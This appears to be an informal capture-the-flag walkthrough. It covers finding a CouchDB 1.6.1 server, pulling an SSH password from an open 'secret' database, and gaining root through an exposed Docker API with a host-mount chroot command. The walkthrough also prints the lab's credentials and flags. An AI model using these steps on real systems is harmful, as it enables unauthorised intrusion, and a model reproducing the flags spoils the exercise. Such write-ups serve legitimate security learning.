first thing we gonna do is to scan for ports : 

if u scan the first 1000 ports u will end up only with one  : 

////////////////////// 

 nmap -p1-1000 10.10.126.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 20:06 GMT
Nmap scan report for 10.10.126.10
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds

///////////////////////// 

but if u dig further u will find that its more than one 

/////////////// 

nmap -p2000-10000 10.10.126.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 20:10 GMT
Nmap scan report for 10.10.126.10
Host is up (0.16s latency).
Not shown: 8000 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 537.28 seconds

/////////// 

so we have 2 ports : ssh on 22 and couchdb on 5984


so  the database management system installed on the server is : couchdb on port 5984

using nmap again to know the version of the management system installed on the server: 

which is : 1.6.1

////////////////// 

nmap -sV -p5984 10.10.126.10  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 20:27 GMT
Nmap scan report for 10.10.126.10
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds

//////////// 

The web administration tool for CouchDB is called Futon (for older versions) or Fauxton (for newer versions). The typical path for accessing the web administration tool is:

_utils

so lets go there : http://10.10.52.206:5984/_utils/

as the  Apache CouchDB® 3.5 Documentation says : 

In your installation, any time you GET /_all_dbs , you should see the system databases in the list , so the path to list all databases in the web browser of the database management system is going to be http://10.10.52.206:5984/_all_dbs , which this link result in showing this in the browser  : 

["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]

the credentials that u will find in the web administration tool are inside a database called secret , in the field "passwordbackup" u will find this credentials :
"atena:t4qfzcc4qN##"

thos are the credentials for ssh login , u can use them to remotely acces the machine like this : 

////////////////////// 

ssh atena@10.10.184.73                  
The authenticity of host '10.10.184.73 (10.10.184.73)' can't be established.
ED25519 key fingerprint is SHA256:QXIT4W/vOthS71YtOAr7s67oloxpMmr0GLRVL9iVFJM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.184.73' (ED25519) to the list of known hosts.
atena@10.10.184.73's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
atena@ubuntu:~$

 /////////////////// 


u will find a flag here : 

////////////////////// 

atena@ubuntu:~$ pwd
/home/atena
atena@ubuntu:~$ ls  
user.txt
atena@ubuntu:~$ cat user.txt 
THM{1ns3cure_couchdb}
atena@ubuntu:~$

////////////////// 

now if we used netstat to check ports that listens we can find that docker api is available 

//////////  

atena@ubuntu:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN      -               

and also docker cli 


atena@ubuntu:~$ which docker
/usr/bin/docker
atena@ubuntu:~$ docker --version
Docker version 18.09.7, build 2d0083d


////////////  


and we have an alpine img also : 

atena@ubuntu:~$ docker -H tcp://127.0.0.1:2375 images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              389fef711851        4 years ago         5.58MB


since Docker runs as root. Any user who can reach this API can control the host via containers.

using this cmnd : docker -H tcp://127.0.0.1:2375 run -it -v /:/host alpine chroot /host /bin/sh

we are Mounting / into the container : In Docker: -v /:/host → this mounts the host /  into the container  at /host.

-v /:/host → mount host filesystem

The -v option in Docker mounts a directory from the host into the container.

Here, we are mounting the host’s / (everything on the host) into the container at /host.

This means anything inside /host in the container is actually the real host filesystem.

chroot /host /bin/sh → change root

chroot switches the root directory for the shell to /host.

Because /host is the mounted host /, the shell now sees the host filesystem as its root.

So when you run commands, you’re running them on the host, not inside the container.

In plain words:

We mount the host / into the container so the container can see the host files.

Then we use chroot to “move” the shell into that mount, so the shell thinks it’s on the host.

Everything you do in that shell now affects the actual host as root.

Key idea: mount = give access, chroot = make shell operate in that access as root

Mounting is like linking directories: the container’s /host points to the host’s /.

Anything you change inside /host in the container actually changes the host’s /, because they’re the same files.

The shell is technically running inside the container, but since it’s operating in the mounted directory, it has full access to the host’s filesystem.

here u find the flag : 

/////////////////// 

atena@ubuntu:~$ docker -H tcp://127.0.0.1:2375 run -it -v /:/host alpine chroot /host /bin/sh
# ls
bin   etc	 initrd.img.old  lost+found  opt   run   sys  var
boot  home	 lib		 media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		 mnt	     root  srv   usr  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt  
THM{RCE_us1ng_Docker_API}
# Connection to 10.10.184.73 closed by remote host.
Connection to 10.10.184.73 closed.

///////////////// 





